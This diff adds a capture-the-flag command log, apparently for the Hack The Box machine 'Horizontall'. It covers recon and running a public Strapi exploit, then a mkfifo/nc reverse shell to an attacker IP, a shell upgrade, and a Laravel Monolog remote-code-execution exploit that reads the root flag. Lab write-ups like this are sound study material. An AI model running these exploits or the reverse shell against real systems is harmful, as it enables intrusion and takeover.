@@ -1,0 +1,33 @@
+sudo nmap -sC -sS -sV 10.10.11.105
+ping horizontall.htb
+sudo nano /etc/hosts
+wget http://horizontall.htb/js/app.c68eb462.js
+grep -na app.c68eb462.js -Pe "http" # http://api-prod.horizontall.htb/reviews
+sudo nano /etc/hosts
+# http://api-prod.horizontall.htb/admin -> http://api-prod.horizontall.htb/admin/auth/login
+# Strapi es un cms https://strapi.io/
+# en view-source:http://api-prod.horizontall.htb/admin/main.da91597e.chunk.js buscamos npm https://registry.npmjs.org/strapi-plugin-upload/-/strapi-plugin-upload-3.0.0-beta.17.4.tgz
+# en exploit db https://www.exploit-db.com/exploits/50239
+
+python3 50239.py http://api-prod.horizontall.htb/ 
+
+
+# http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet                                                
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.224 9000 >/tmp/f
+
+python3 -c 'import pty;  pty.spawn("/bin/bash")'
+
+
+netstat -tulpn
+
+
+
+
+s
+
+python3 -m http.server 7899
+
+
+python3 exploit.py 127.0.0.1:8000 Monolog/RCE1 "cat /root/root.txt"
+
+    /blob/master/exploit.py
